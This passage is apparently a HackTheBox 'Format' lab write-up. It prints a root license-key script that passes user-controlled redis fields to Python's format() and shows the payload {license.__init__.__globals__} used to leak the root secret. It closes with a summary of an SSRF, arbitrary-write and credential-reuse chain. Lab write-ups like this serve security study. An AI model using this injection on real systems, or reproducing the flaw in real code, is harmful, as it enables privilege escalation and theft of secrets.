<span class="kn">import</span> <span class="nn">redis</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">class</span> <span class="nc">License</span><span class="p">():</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">40</span><span class="p">))</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">created</span> <span class="o">=</span> <span class="n">date</span><span class="p">.</span><span class="n">today</span><span class="p">()</span>

<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Microblog license key manager can only be run as root"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Microblog license key manager'</span><span class="p">)</span>
<span class="n">group</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">add_mutually_exclusive_group</span><span class="p">(</span><span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">group</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--provision'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Provision license key for specified user'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'username'</span><span class="p">)</span>
<span class="n">group</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span> <span class="s">'--deprovision'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Deprovision license key for specified user'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'username'</span><span class="p">)</span>
<span class="n">group</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-c'</span><span class="p">,</span> <span class="s">'--check'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Check if specified license key is valid'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'license_key'</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="p">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">unix_socket_path</span><span class="o">=</span><span class="s">'/var/run/redis/redis.sock'</span><span class="p">)</span>

<span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/root/license/secret"</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
<span class="n">secret_encoded</span> <span class="o">=</span> <span class="n">secret</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
<span class="n">salt</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'microblogsalt123'</span>
<span class="n">kdf</span> <span class="o">=</span> <span class="n">PBKDF2HMAC</span><span class="p">(</span><span class="n">algorithm</span><span class="o">=</span><span class="n">hashes</span><span class="p">.</span><span class="n">SHA256</span><span class="p">(),</span><span class="n">length</span><span class="o">=</span><span class="mi">32</span><span class="p">,</span><span class="n">salt</span><span class="o">=</span><span class="n">salt</span><span class="p">,</span><span class="n">iterations</span><span class="o">=</span><span class="mi">100000</span><span class="p">,</span><span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>
<span class="n">encryption_key</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">kdf</span><span class="p">.</span><span class="n">derive</span><span class="p">(</span><span class="n">secret_encoded</span><span class="p">))</span>

<span class="n">f</span> <span class="o">=</span> <span class="n">Fernet</span><span class="p">(</span><span class="n">encryption_key</span><span class="p">)</span>
<span class="n">l</span> <span class="o">=</span> <span class="n">License</span><span class="p">()</span>

<span class="c1">#provision
</span><span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">):</span>
    <span class="n">user_profile</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">hgetall</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">user_profile</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"User does not exist. Please provide valid username."</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
    <span class="n">existing_keys</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/root/license/keys"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
    <span class="n">all_keys</span> <span class="o">=</span> <span class="n">existing_keys</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">user_key</span> <span class="ow">in</span> <span class="n">all_keys</span><span class="p">:</span>
        <span class="k">if</span><span class="p">(</span><span class="n">user_key</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"License key has already been provisioned for this user"</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
    <span class="n">prefix</span> <span class="o">=</span> <span class="s">"microblog"</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="s">"username"</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">firstlast</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="s">"first-name"</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="n">r</span><span class="p">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="s">"last-name"</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">license_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">"{license.license}"</span> <span class="o">+</span> <span class="n">firstlast</span><span class="p">).</span><span class="nb">format</span><span class="p">(</span><span class="n">license</span><span class="o">=</span><span class="n">l</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Plaintext license key:"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">license_key</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="n">license_key_encoded</span> <span class="o">=</span> <span class="n">license_key</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
    <span class="n">license_key_encrypted</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">license_key_encoded</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Encrypted license key (distribute to customer):"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">license_key_encrypted</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/root/license/keys"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">license_keys_file</span><span class="p">:</span>
        <span class="n">license_keys_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span> <span class="o">+</span> <span class="s">":"</span> <span class="o">+</span> <span class="n">license_key_encrypted</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="c1">#deprovision
</span><span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">deprovision</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"License key deprovisioning coming soon"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

<span class="c1">#check
</span><span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">license_key_decrypted</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"License key valid! Decrypted value:"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">license_key_decrypted</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"License key invalid"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Taking a close look at the script, it seems to be loading some secret from <code class="language-plaintext highlighter-rouge">/root/license/secret</code> into the variable <code class="language-plaintext highlighter-rouge">secret</code>. It then connects to the redis database and query users depending on the arguments that were passed.</p>

<p>When given the <code class="language-plaintext highlighter-rouge">-p</code> flag followed by a username, the script process it as follows;</p>
<ol>
  <li>Checks to see if the username exist in the redis database. If not, it exit.</li>
  <li>Checks to see if the username is in <code class="language-plaintext highlighter-rouge">/root/license/keys</code>, which seems to be used to store username and license key. If it is, it exits.</li>
  <li>Uses the userâ€™s <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">first-name</code>, and <code class="language-plaintext highlighter-rouge">last-name</code> in a call to <code class="language-plaintext highlighter-rouge">format()</code> to build a string that is later printed.</li>
</ol>

<p>This last point is very interesting because both <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">first-name</code>, and <code class="language-plaintext highlighter-rouge">last-name</code> are values we control, and passing untrusted data to <code class="language-plaintext highlighter-rouge">format()</code> can cause bad things as we could be able to leak data into the string;</p>

<p><img src="/assets/img/Pasted image 20230901222823.png" alt="" /></p>

<p>The only object we will have access to in the context of <code class="language-plaintext highlighter-rouge">format()</code> is <code class="language-plaintext highlighter-rouge">license</code>, which is an instance of the <code class="language-plaintext highlighter-rouge">License</code> class, and doesnâ€™t really have anything interesting. However, all class objects in python has the attribute <code class="language-plaintext highlighter-rouge">__init__.__globals__</code>, which is a dictionary containing key-value mappings of all global objects in itâ€™s scope;</p>

<p><img src="/assets/img/Pasted image 20230901222652.png" alt="" /></p>

<p>Since our <code class="language-plaintext highlighter-rouge">secret</code> variable was defined globally outside of any function, we could leak it by setting any of the values we control that are used in the <code class="language-plaintext highlighter-rouge">format()</code> call to <code class="language-plaintext highlighter-rouge">{license.__init__.__globals__}</code>;</p>

<p><img src="/assets/img/Pasted image 20230901224246.png" alt="" /></p>

<p>This leaked the secret successfully;</p>

<p><img src="/assets/img/Pasted image 20230901224358.png" alt="" /></p>

<p>Using that as a password, I was able to login as <code class="language-plaintext highlighter-rouge">root</code>;</p>

<p><img src="/assets/img/Pasted image 20230901224453.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP discovered port <strong>22</strong> (SSH), <strong>80</strong> (Nginx), and <strong>3000</strong> (Gitea)</li>
  <li>Gitea instance has a public repo with containing the full source of the web app</li>
  <li>Exploited an SSRF to query backend redis, and elevate to <strong>pro</strong> user
    <ul>
      <li>Exploited an arbitrary write vulnerability to gain a shell as <code class="language-plaintext highlighter-rouge">www-data</code></li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">www-data</code>;
    <ul>
      <li>Found creds for a local user  <code class="language-plaintext highlighter-rouge">cooper</code> in the redis database</li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">cooper</code>;
    <ul>
      <li>Exploited a call to <code class="language-plaintext highlighter-rouge">format()</code> with user-controlled value in a custom sudo script to leak root password.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="medium" /><category term="web" /><category term="gitea" /><category term="php" /><category term="redis" /><category term="arbitrary write" /><category term="lfi" /><category term="nginx" /><category term="proxy_pass" /><category term="python format string exploit" /><summary type="html"><![CDATA[Format is a nice medium linux machine on HackTheBox. It features a custom web application for creating blogs that is vulnerable to arbitrary read and write, which is easy to detect as the full application source code is accessible in a public Gitea repo. Once inside, youâ€™ll be recovering some creds from the backend redis server, and exploiting a format string vulnerability in a python program to gain root.]]></summary></entry></feed>